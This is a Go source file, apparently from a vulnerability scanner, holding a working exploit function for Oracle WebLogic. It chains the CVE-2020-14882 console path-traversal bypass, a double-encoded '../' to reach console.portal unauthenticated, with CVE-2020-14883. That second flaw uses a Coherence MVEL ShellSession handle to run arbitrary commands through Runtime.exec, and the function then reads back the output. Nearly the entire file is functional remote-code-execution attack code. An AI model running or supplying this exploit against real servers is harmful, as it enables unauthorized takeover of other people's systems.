package weblogic

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// exploitConsole abuses the CVE-2020-14882 console path traversal to reach
// console.portal unauthenticated and triggers CVE-2020-14883 by passing a
// Coherence ShellSession handle, which executes the command through MVEL.
func exploitConsole(o ExploitOptions) (string, error) {
	marker := fmt.Sprintf("%d", time.Now().UnixNano()%1000000)
	script := buildScriptNoSpace(marker)
	handle := fmt.Sprintf(
		`com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('%s')")`,
		script)
	u := baseOf(o) + "/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=" + url.QueryEscape(handle)

	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("User-Agent", "cve-scanner")
	client := &http.Client{Timeout: o.Timeout, Transport: pickTransport(nil)}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("GET console bypass: %w", err)
	}
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
	resp.Body.Close()
	if resp.StatusCode == 404 {
		return "", fmt.Errorf("console.portal not reachable (HTTP 404), target not vulnerable")
	}

	out, err := readBack(baseOf(o), marker, o.Timeout+5*time.Second)
	if err != nil {
		return "", fmt.Errorf("%w (trigger HTTP %d: %s)", err, resp.StatusCode, strings.TrimSpace(string(body)))
	}
	return out, nil
}
